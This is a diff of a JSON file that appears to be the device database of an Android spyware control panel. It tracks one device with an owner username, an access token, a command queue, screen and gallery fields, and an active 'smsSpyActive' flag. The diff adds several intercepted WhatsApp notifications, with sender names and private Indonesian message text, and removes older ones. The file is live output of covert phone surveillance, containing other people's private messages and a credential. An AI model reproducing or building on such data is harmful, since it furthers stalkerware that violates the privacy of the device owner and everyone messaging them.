@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003609892,
+    "lastSeen": 1776003613359,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (2 pesan): ~ zaa?",
+        "content": "apaan cii",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003614982
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎2 pesan baru",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003611087
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (2 pesan): ~ zaa?",
+        "content": "apaan cii",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003611072
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
@@ -4099,30 +4123,6 @@
         "time": "12/04 00:18",
         "pkg": "com.whatsapp",
         "receivedAt": 1775927934112
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ k",
-        "content": "💟 Stiker",
-        "time": "12/04 00:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927932285
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "~ k: 💟 Stiker",
-        "time": "12/04 00:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927932279
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "~ tapzyUrPrblm: sip mksih",
-        "time": "12/04 00:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927929856
       }
     ],
     "galleryPhotos": [],
